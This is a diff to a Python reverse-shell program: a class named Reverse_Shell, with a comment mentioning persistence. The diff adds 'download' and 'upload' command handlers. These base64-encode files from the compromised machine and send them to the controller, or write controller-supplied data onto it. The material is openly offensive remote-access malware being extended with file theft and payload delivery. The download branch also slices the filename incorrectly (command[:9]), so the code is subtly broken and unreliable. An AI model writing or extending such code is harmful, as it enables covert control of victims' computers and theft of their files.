@@ -5,6 +5,7 @@ import time
 import os
 import shutil
 import sys
+import base64
 
 
 # for persistance:
@@ -56,6 +57,13 @@ class Reverse_Shell:
                     os.chdir(command[3:])
                 except:
                     continue
+            elif command[:8] == "download":
+                with open(command[:9], "rb") as file:
+                    self.reliable_send(base64.b64encode(file.read()))
+            elif command[:6] == "upload":
+                with open(command[7:],"wb") as fin:
+                    result = self.reliable_receive()
+                    fin.write(base64.b64decode(result))
             else:
                 try:
                     # creation of the command, see documentation
